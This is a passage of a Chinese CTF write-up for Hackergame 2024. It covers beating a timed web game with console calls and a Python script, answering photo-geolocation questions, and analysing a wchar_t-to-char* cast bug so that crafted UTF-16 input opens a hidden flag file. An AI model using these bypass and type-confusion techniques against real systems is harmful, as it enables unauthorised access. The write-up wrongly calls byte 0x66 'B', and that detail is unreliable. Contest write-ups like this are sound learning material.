+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'answer'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'?'</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'answer'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">backgroundColor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'#fff'</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">allowInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">stopUpdate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'你选错了，挑战失败！'</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'flex'</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="mf">200</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><code>submit</code> 函数发送例如 <code>{ "input": ["&lt;", "&gt;", ...] }</code> 的<span class="heti-skip"><span class="heti-spacing"> </span>JSON<span class="heti-spacing"> </span></span>数据：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">submit</span><span class="p">(</span><span class="nx">inputs</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/submit'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/json'</span><span class="p">,</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+<span class="w">                </span><span class="nx">inputs</span>
+<span class="w">            </span><span class="p">}),</span>
+<span class="w">        </span><span class="p">})</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">stopUpdate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'flex'</span><span class="p">;</span>
+<span class="w">        </span><span class="p">})</span>
+<span class="w">        </span><span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">stopUpdate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'提交失败，请刷新页面重试'</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'flex'</span><span class="p">;</span>
+<span class="w">        </span><span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="_3">解法一：控制台调用函数<a class="headerlink" href="#_3" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>由于按钮点击有<span class="heti-skip"><span class="heti-spacing"> </span>200<span class="heti-spacing"> </span></span>毫秒的冷却，所以如果想要自动填写答案，需要先在开发者工具使用覆盖功能修改代码。</p>
+<p>没这么麻烦的必要，可以直接在控制台调用 <code>submit</code> 函数，发送正确答案：</p>
+<div class="highlight"><pre><span></span><code><span class="nx">submit</span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">values</span><span class="p">.</span><span class="nx">map</span><span class="p">(([</span><span class="nx">v1</span><span class="p">,</span><span class="w"> </span><span class="nx">v2</span><span class="p">])</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">v1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">v2</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">'&lt;'</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">'&gt;'</span><span class="p">))</span>
+</code></pre></div>
+<p>需要注意得等倒计时结束，不然会「检测到时空穿越，挑战失败<heti-adjacent class="heti-adjacent-half">！</heti-adjacent><heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。</p>
+<h3 id="_4">解法二：编写脚本发送请求<a class="headerlink" href="#_4" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+
+<span class="n">base_url</span> <span class="o">=</span> <span class="s2">"http://202.38.93.141:12122/"</span>
+<span class="n">token</span> <span class="o">=</span> <span class="s2">"&lt;your_token&gt;"</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">"token"</span><span class="p">:</span> <span class="n">token</span><span class="p">})</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/game"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{})</span>
+<span class="n">game_data</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+
+<span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"&lt;"</span> <span class="k">if</span> <span class="n">value1</span> <span class="o">&lt;</span> <span class="n">value2</span> <span class="k">else</span> <span class="s2">"&gt;"</span> <span class="k">for</span> <span class="n">value1</span><span class="p">,</span> <span class="n">value2</span> <span class="ow">in</span> <span class="n">game_data</span><span class="p">[</span><span class="s2">"values"</span><span class="p">]]</span>
+
+<span class="n">start_time</span> <span class="o">=</span> <span class="n">game_data</span><span class="p">[</span><span class="s2">"startTime"</span><span class="p">]</span>
+<span class="n">current_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">current_time</span> <span class="o">&lt;</span> <span class="n">start_time</span><span class="p">:</span>
+    <span class="n">wait_time</span> <span class="o">=</span> <span class="n">start_time</span> <span class="o">-</span> <span class="n">current_time</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">wait_time</span><span class="p">)</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/submit"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">"inputs"</span><span class="p">:</span> <span class="n">answers</span><span class="p">})</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
+</code></pre></div>
+<h2 id="general-40"><span>[General]<span class="heti-spacing"> </span></span>旅行照片<span><span class="heti-spacing"> </span>4.0</span><a class="headerlink" href="#general-40" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<h3 id="1-2">题目<span><span class="heti-spacing"> </span>1-2</span><a class="headerlink" href="#1-2" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<h4 id="q1_1">Q1<a class="headerlink" href="#q1_1" title="Permanent link">¶</a></h4>
+<blockquote>
+<p>问题<span class="heti-skip"><span class="heti-spacing"> </span>1:<span class="heti-spacing"> </span></span>照片拍摄的位置距离中科大的哪个校门更近<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（格式：<span>X<span class="heti-spacing"> </span></span>校区<span class="heti-skip"><span class="heti-spacing"> </span>Y<span class="heti-spacing"> </span></span>门，均为一个汉字）</p>
+</blockquote>
+<p>百度地图搜索「科里科气科创驿站<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，得到「中国蜀山科里科气科创驿站（科大站<heti-adjacent class="heti-adjacent-half">）</heti-adjacent><heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。</p>
+<p>最近的两个门不是校门，往南走有东校区的西门，小小的。</p>
+<p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/main/general/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/images/q1.png"><img alt="q1" src="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/main/general/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/images/q1.png"/></a></p>
+<p>答案：<code>东校区西门</code></p>
+<h4 id="q2_1">Q2<a class="headerlink" href="#q2_1" title="Permanent link">¶</a></h4>
+<blockquote>
+<p>问题<span class="heti-skip"><span class="heti-spacing"> </span>2:<span class="heti-spacing"> </span></span>话说<span class="heti-skip"><span class="heti-spacing"> </span>Leo<span class="heti-spacing"> </span></span>酱上次出现在桁架上是……科大今年的<span class="heti-skip"><span class="heti-spacing"> </span>ACG<span class="heti-spacing"> </span></span>音乐会？活动日期我没记错的话是<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（格式：YYYYMMDD）</p>
+</blockquote>
+<p><span>Bilibili<span class="heti-spacing"> </span></span>搜索「中科大<span class="heti-skip"><span class="heti-spacing"> </span>ACG<span class="heti-spacing"> </span></span>音乐会<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，可以找到帐号「中科大<span class="heti-skip"><span class="heti-spacing"> </span>LEO<span class="heti-spacing"> </span></span>动漫协会<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，他们有个视频合集：<a href="https://space.bilibili.com/7021308/channel/collectiondetail?sid=3077731"><span>2024ACG<span class="heti-spacing"> </span></span>音乐会</a>。</p>
+<p>视频简介可以找到「<span>2024<span class="heti-spacing"> </span></span>年<span class="heti-skip"><span class="heti-spacing"> </span>5<span class="heti-spacing"> </span></span>月<span class="heti-skip"><span class="heti-spacing"> </span>19<span class="heti-spacing"> </span></span>日 中国科大 第三届<span class="heti-skip"><span class="heti-spacing"> </span>ACG<span class="heti-spacing"> </span></span>音乐会<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。</p>
+<p>答案：<code>20240519</code></p>
+<p>比赛时当作背景音在旁边放着听，科大的活动氛围真好。</p>
+<h3 id="3-4">题目<span><span class="heti-spacing"> </span>3-4</span><a class="headerlink" href="#3-4" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<h4 id="q3_1">Q3<a class="headerlink" href="#q3_1" title="Permanent link">¶</a></h4>
+<blockquote>
+<p>问题<span class="heti-skip"><span class="heti-spacing"> </span>3:<span class="heti-spacing"> </span></span>这个公园的名称是什么<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（不需要填写公园所在市区等信息）</p>
+</blockquote>
+<p>图片右下角垃圾桶找到地点「六安<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。</p>
+<p>搜索「六安 公园 彩虹跑道」找到文章：<a href="https://www.sohu.com/a/498872898_100023473">彩虹跑道、灯光喷泉！六安城区这两所公园又变美了</a>。</p>
+<p>答案：<code>中央公园</code> 或 <code>中央森林公园</code></p>
+<p>我只用到了搜索引擎，没用任何<span><span class="heti-spacing"> </span>APP</span>，甚至不是国内搜索引擎。可能，<sub><span>~<span class="heti-spacing"> </span></span>狗运</sub><span class="heti-skip"><span class="heti-spacing"> </span>~<span class="heti-spacing"> </span></span>关键词猜得好胜过一切吧。</p>
+<h4 id="q4_1">Q4<a class="headerlink" href="#q4_1" title="Permanent link">¶</a></h4>
+<blockquote>
+<p>问题<span class="heti-skip"><span class="heti-spacing"> </span>4:<span class="heti-spacing"> </span></span>这个景观所在的景点的名字是<heti-adjacent class="heti-adjacent-half">？</heti-adjacent>（三个汉字）</p>
+</blockquote>
+<p>百度识图得到三峡大坝，搜索「三峡大坝 喷泉」得到「截流四面体纪念石<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，进而得到景点。</p>
+<p>国内地点，可能还是百度好用……</p>
+<p>答案：<code>坛子岭</code></p>
+<h3 id="5-6">题目<span><span class="heti-spacing"> </span>5-6</span><a class="headerlink" href="#5-6" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<h4 id="q5_1">Q5<a class="headerlink" href="#q5_1" title="Permanent link">¶</a></h4>
+<p>百度识图能发现一个图片中房子非常类似拍摄位置近处建筑，只不过是另一个角度：</p>
+<p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/main/general/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/images/q5.png"><img alt="q5" src="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/main/general/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/images/q5.png"/></a></p>
+<p>它来自<span class="heti-skip"><span class="heti-spacing"> </span>Bilibili<span class="heti-spacing"> </span></span>的一个视频：<a href="https://www.bilibili.com/video/BV15J411R72H">和谐号黄医生动检车驶出动车所，进入京张高铁正线运行</a></p>
+<p>视频简介能够得到此处是「北京北动车所<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，在地图中翻到最近的医院是「北京积水潭医院」</p>
+<p>答案：<code>积水潭医院</code></p>
+<h4 id="q6_1">Q6<a class="headerlink" href="#q6_1" title="Permanent link">¶</a></h4>
+<blockquote>
+<p>问题<span class="heti-skip"><span class="heti-spacing"> </span>6:<span class="heti-spacing"> </span></span>左下角的动车组型号是？</p>
+</blockquote>
+<p>搜索 「<span>"<span class="heti-spacing"> </span></span>四编组动车<span class="heti-skip"><span class="heti-spacing"> </span>" "<span class="heti-spacing"> </span></span>北京<span class="heti-skip"><span class="heti-spacing"> </span>"<span class="heti-spacing"> </span></span>北动车所<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>，得到网页：<a href="https://www.china-emu.cn/Trains/Model/detail-26012-201-F.html">https://www.china-emu.cn/Trains/Model/detail-26012-201-F.html</a></p>
+<p>答案：<code>CRH6F-A</code></p>
+<h3 id="_5">碎碎念<a class="headerlink" href="#_5" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>不喜欢做国内地点，百度搜索和百度地图用着很难受，至今没搞明白怎么在某处搜索附近的建筑物。</p>
+<p>而且国内地点很可能突然有人蹦出来告诉你<heti-adjacent class="heti-adjacent-half">：</heti-adjacent>「嘿，我<span class="heti-skip"><span class="heti-spacing"> </span>XXX APP<span class="heti-spacing"> </span></span>随手一搜就出来了<heti-adjacent class="heti-adjacent-half">」</heti-adjacent>。</p>
+<p>多新鲜啊 —— <span>Q5-6<span class="heti-spacing"> </span></span>题目文案。</p>
+<h2 id="general_2"><span>[General]<span class="heti-spacing"> </span></span>不宽的宽字符<a class="headerlink" href="#general_2" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<p>CPP + WinAPI，看见人都晕了。</p>
+<h3 id="_6">程序分析<a class="headerlink" href="#_6" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>程序首先通过<span class="heti-skip"><span class="heti-spacing"> </span>Windows API<span class="heti-spacing"> </span></span>初始化控制台环境，获取标准输入输出句柄并设置控制台模式：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Get the console input and output handles</span>
+<span class="n">HANDLE</span><span class="w"> </span><span class="n">hConsoleInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetStdHandle</span><span class="p">(</span><span class="n">STD_INPUT_HANDLE</span><span class="p">);</span>
+<span class="n">HANDLE</span><span class="w"> </span><span class="n">hConsoleOutput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetStdHandle</span><span class="p">(</span><span class="n">STD_OUTPUT_HANDLE</span><span class="p">);</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hConsoleInput</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">hConsoleOutput</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// Handle error – we can't get input/output handles.</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">DWORD</span><span class="w"> </span><span class="n">mode</span><span class="p">;</span>
+<span class="n">GetConsoleMode</span><span class="p">(</span><span class="n">hConsoleInput</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">mode</span><span class="p">);</span>
+<span class="n">SetConsoleMode</span><span class="p">(</span><span class="n">hConsoleInput</span><span class="p">,</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ENABLE_PROCESSED_INPUT</span><span class="p">);</span>
+</code></pre></div>
+<p>接着使用 <code>ReadFile</code> 函数从控制台读取用户输入，存入<span class="heti-skip"><span class="heti-spacing"> </span>256<span class="heti-spacing"> </span></span>字节的缓冲区 <code>inputBuffer</code>，并移除末尾的换行符：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Read the console input (wide characters)</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">hConsoleInput</span><span class="p">,</span><span class="w"> </span><span class="n">inputBuffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">charsRead</span><span class="p">,</span><span class="w"> </span><span class="k">nullptr</span><span class="p">))</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="c1">// Handle read error</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Remove the newline character at the end of the input</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">charsRead</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">inputBuffer</span><span class="p">[</span><span class="n">charsRead</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sa">L</span><span class="sc">'\n'</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">inputBuffer</span><span class="p">[</span><span class="n">charsRead</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="sc">'\0'</span><span class="p">;</span><span class="w"> </span><span class="c1">// Null-terminate the string</span>
+<span class="w">    </span><span class="n">charsRead</span><span class="o">--</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>为了处理不同语言的字符，程序将用户输入的<span class="heti-skip"><span class="heti-spacing"> </span>UTF-8<span class="heti-spacing"> </span></span>编码内容转换为宽字符。这个转换过程会保留输入中的所有字节，包括 <code>NULL</code> 字节：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Convert to WIDE chars</span>
+<span class="kt">wchar_t</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
+<span class="n">MultiByteToWideChar</span><span class="p">(</span><span class="n">CP_UTF8</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">inputBuffer</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">wchar_t</span><span class="p">));</span>
+</code></pre></div>
+<p>然后程序把转换后的内容存入 <code>wstring</code> 对象，并自信地在后面加上 <code>you_cant_get_the_flag</code>，试图阻止直接访问目标文件：</p>
+<div class="highlight"><pre><span></span><code><span class="n">std</span><span class="o">::</span><span class="n">wstring</span><span class="w"> </span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span>
+
+<span class="c1">// Haha!</span>
+<span class="n">filename</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="sa">L</span><span class="s">"you_cant_get_the_flag"</span><span class="p">;</span>
+</code></pre></div>
+<p>然而在打开文件时存在一个类型转换错误，直接将 <code>wchar_t*</code> 强制转换为了 <code>char*</code>：</p>
+<div class="highlight"><pre><span></span><code><span class="n">std</span><span class="o">::</span><span class="n">wifstream</span><span class="w"> </span><span class="n">file</span><span class="p">;</span>
+<span class="n">file</span><span class="p">.</span><span class="n">open</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">filename</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
+</code></pre></div>
+<p>最后，如果文件成功打开，程序会读取第一行内容作为<span class="heti-skip"><span class="heti-spacing"> </span>Flag<span class="heti-spacing"> </span></span>并输出：</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">file</span><span class="p">.</span><span class="n">is_open</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">false</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">std</span><span class="o">::</span><span class="n">wcout</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="sa">L</span><span class="s">"Failed to open the file!"</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">std</span><span class="o">::</span><span class="n">wstring</span><span class="w"> </span><span class="n">flag</span><span class="p">;</span>
+<span class="n">std</span><span class="o">::</span><span class="n">getline</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">);</span>
+
+<span class="n">std</span><span class="o">::</span><span class="n">wcout</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="sa">L</span><span class="s">"The flag is: "</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="sa">L</span><span class="s">". Congratulations!"</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+</code></pre></div>
+<h3 id="_7">漏洞分析<a class="headerlink" href="#_7" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>在<span class="heti-skip"><span class="heti-spacing"> </span>Windows<span class="heti-spacing"> </span></span>系统中，<code>wchar_t</code> 使用<span class="heti-skip"><span class="heti-spacing"> </span>UTF-16<span class="heti-spacing"> </span></span>编码，这意味着每个字符用<span class="heti-skip"><span class="heti-spacing"> </span>2<span class="heti-spacing"> </span></span>个字节表示。比如字符 <code>A</code> 在<span class="heti-skip"><span class="heti-spacing"> </span>UTF-16<span class="heti-spacing"> </span></span>中表示为 <code>0x0041</code>。</p>
+<p><span>Windows<span class="heti-spacing"> </span></span>默认使用小端序（Little Endian<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，所以在这道题中字符 <code>A</code> 在内存中实际是 <code>41 00</code>。</p>
+<p>程序的核心漏洞在于对字符串的类型转换，当程序执行：</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">filename</span><span class="p">.</span><span class="n">c_str</span><span class="p">()</span>
+</code></pre></div>
+<p>宽字符字符串 <code>wchar_t*</code> 被强制转换为普通字符串 <code>char*</code>，原本的<span class="heti-skip"><span class="heti-spacing"> </span>UTF-16<span class="heti-spacing"> </span></span>字节被直接解释为连续的字节序列。</p>
+<p>举个例子，如果我们输入 <code>flag</code>：</p>
+<p>程序会将其转换为<span class="heti-skip"><span class="heti-spacing"> </span>UTF-16<span class="heti-spacing"> </span></span>编码的字节串：</p>
+<div class="highlight"><pre><span></span><code>$ echo -n "flag" | iconv -f ascii -t utf-16le | hexyl -g 2
+┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
+│00000000│ 6600 6c00 6100 6700 ┊                     │f⋄l⋄a⋄g⋄┊        │
+└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
+</code></pre></div>
+<p>然后追加 <code>you_cant_get_the_flag</code>：</p>
+<div class="highlight"><pre><span></span><code>$ echo -n "flagyou_cant_get_the_flag" | iconv -f ascii -t utf-16le | hexyl -g 2
+┌────────┬─────────────────────┬─────────────────────┬────────┬────────┐
+│00000000│ 6600 6c00 6100 6700 ┊ 7900 6f00 7500 5f00 │f⋄l⋄a⋄g⋄┊y⋄o⋄u⋄_⋄│
+│00000010│ 6300 6100 6e00 7400 ┊ 5f00 6700 6500 7400 │c⋄a⋄n⋄t⋄┊_⋄g⋄e⋄t⋄│
+│00000020│ 5f00 7400 6800 6500 ┊ 5f00 6600 6c00 6100 │_⋄t⋄h⋄e⋄┊_⋄f⋄l⋄a⋄│
+│00000030│ 6700                ┊                     │g⋄      ┊        │
+└────────┴─────────────────────┴─────────────────────┴────────┴────────┘
+</code></pre></div>
+<p>当这个字符串被强制转换为 <code>char*</code> 时，程序会从这个内存地址开始，按照<span class="heti-skip"><span class="heti-spacing"> </span>C<span class="heti-spacing"> </span></span>风格字符串的规则读取字节序列：</p>
+<div class="highlight"><pre><span></span><code>66 00 6C 00 61 00 67 00 ...
+   ^
+遇到 00 时字符串结束
+</code></pre></div>
+<p>即文件名为 <code>B</code>（<span>ASCII<span class="heti-spacing"> </span></span>编码为<span><span class="heti-spacing"> </span>66</span><heti-adjacent class="heti-adjacent-half">）</heti-adjacent>。</p>
+<p>所以如果我们精心构造一个字符串，让它在<span class="heti-skip"><span class="heti-spacing"> </span>UTF-16<span class="heti-spacing"> </span></span>编码下的字节序列满足：当被强制转换为 <code>char*</code> 时，这些字节正好表示 <code>Z:\\theflag</code>，并且紧跟一个 <code>NULL</code> 字节。</p>
+<p>假设我们需要构造路径 <code>Z:\\theflag</code>，它的字节序列（包括 <code>NULL</code>）是：</p>
+<div class="highlight"><pre><span></span><code>$ echo -ne "Z:\\\\theflag\x00" | hexyl
+┌────────┬─────────────────────────┬─────────────────────────┬────────┬────────┐
+│00000000│ 5a 3a 5c 74 68 65 66 6c ┊ 61 67 00                │Z:\thefl┊ag⋄     │
